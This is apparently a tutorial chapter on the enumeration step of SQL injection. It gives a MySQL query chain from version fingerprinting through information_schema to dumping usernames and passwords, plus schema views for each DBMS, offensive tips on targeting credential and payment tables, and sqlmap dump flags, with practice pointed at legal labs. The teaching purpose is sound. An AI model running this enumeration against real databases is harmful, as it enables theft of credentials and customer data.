# Chapter 11 — Examining / Enumerating the Database

## About the Topic
Before extracting real data, you map the database itself: DBMS type and
version, current database/user, and the schema (databases → tables →
columns) — analogous to a network pentester enumerating hosts/services
before exploiting them.

```
Database Server
 ├── shop        (database)
 │    ├── users     (table)
 │    ├── products  (table)
 │    └── orders    (table)
 ├── staff
 │    ├── users
 │    ├── information
 │    └── audit
 └── accounts
      ├── users
      ├── customers
      └── ...
```

## Practical Example — MySQL Enumeration Chain
```sql
-- 1. Identify DBMS + version
SELECT @@version;
SELECT VERSION();

-- 2. Current database and user
SELECT DATABASE();
SELECT CURRENT_USER();

-- 3. List all databases
SELECT schema_name FROM information_schema.schemata;

-- 4. List tables in current database
SELECT table_name FROM information_schema.tables
WHERE table_schema = DATABASE();

-- 5. List columns of a specific table
SELECT column_name FROM information_schema.columns
WHERE table_name = 'users';

-- 6. Dump the data
SELECT username, password FROM users;
```

### Basic Table Preview (once you have a working payload)
```sql
select * from users LIMIT 1;
```
```
id | username | password
1  | jon      | pass123
```

### Filtering with WHERE
```sql
select * from users where username='admin';
select * from users where username != 'admin';
```

## DBMS-Specific Schema Views

| DBMS | Schema enumeration source |
|---|---|
| MySQL / MariaDB | `information_schema.tables` / `.columns` |
| PostgreSQL | `information_schema.tables`, `pg_catalog.pg_tables` |
| Microsoft SQL Server | `sys.tables`, `sys.columns`, `INFORMATION_SCHEMA` |
| Oracle | `ALL_TABLES`, `ALL_TAB_COLUMNS`, `dual` |
| SQLite | `sqlite_master` |

## Offensive Tips
- Always fingerprint the DBMS first — syntax for enumeration and error
  functions differs completely between MySQL/MSSQL/PostgreSQL/Oracle.
- Prioritize tables with names like `users`, `accounts`, `admin`,
  `credentials`, `staff`, `customers`, `payments`.
- Chain UNION-based extraction (Ch. 06) with this enumeration order:
  version → current DB → table names → column names → data.

## Labs to Practice
- **PortSwigger Academy** — "Examining the database" section:
  - *Querying the database type and version on Oracle / non-Oracle*
  - *Listing the database contents on non-Oracle / Oracle*
- **TryHackMe** — *SQL Injection* room, database enumeration task.
- **TryHackMe** — *SQLMap: The Basics* (`--dbs`, `-D db --tables`,
  `-D db -T table --dump`).

## Key Takeaway
Systematic enumeration (schema → table → column → data) turns a single
injection point into full database compromise.
